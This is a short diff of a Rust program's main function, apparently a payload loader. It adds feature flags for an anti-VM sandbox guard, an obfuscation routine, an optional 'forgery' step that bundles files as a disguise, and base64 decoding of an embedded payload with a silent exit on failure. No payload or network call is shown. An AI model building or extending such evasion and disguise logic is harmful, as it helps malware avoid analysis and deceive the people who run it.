@@ -23,13 +23,17 @@ fn base64_decode_payload() -> Option<Vec<u8>> {
 
 fn main() {
     
-    #[cfg(not(feature = "no_sandbox"))]
+    #[cfg(feature = "sandbox")]
     guard::guard_vm();
 
     obfuscation_noise();
+    
+    #[cfg(feature = "with_forgery")]
+    forgery::bundle::bundlefile();
 
-    // Decode, verify and decrypt the embedded payload in one call
-        let decrypted_data = match base64_decode_payload() {
+    // Base64解码载荷
+    #[cfg(feature = "decrypt")]
+    let decrypted_data = match base64_decode_payload() {
             Some(d) => d,
             None => process::exit(0),
     };
